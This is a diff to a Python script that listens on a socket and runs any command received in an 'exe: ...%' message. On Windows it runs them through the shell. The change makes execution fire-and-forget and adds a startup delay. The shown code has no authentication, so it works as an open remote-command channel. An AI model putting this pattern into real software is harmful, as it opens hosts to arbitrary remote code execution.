@@ -2,18 +2,17 @@ import socket
 import subprocess
 import shlex
 import sys
+import time
 
 def execute_command(command: str):
-    """Executes the given command."""
+    """Executes the given command in a non-blocking way."""
     try:
         # Use shell=True on Windows for proper command execution
         if sys.platform.startswith("win"):
-            subprocess.run(command, shell=True, check=True)
+            subprocess.Popen(command, shell=True)
         else:
             # Use shlex.split on Linux for safe command splitting
-            subprocess.run(shlex.split(command), check=True)
-    except subprocess.CalledProcessError as e:
-        print(f"Error executing command: {e}")
+            subprocess.Popen(shlex.split(command))
     except Exception as e:
         print(f"Unexpected error: {e}")
 
@@ -37,7 +36,7 @@ def main():
             # Check if the message matches the expected format
             if message.startswith("exe: ") and message.endswith("%"):
                 # Extract the command
-                command = message[5:-1]  # Remove "exe: " prefix and "%" suffix
+                command = message[5:-1]  
                 print(f"Executing command: {command}")
                 execute_command(command)
             else:
@@ -53,4 +52,6 @@ def main():
     sock.close()
 
 if __name__ == "__main__":
+    time.sleep(8)
     main()
+
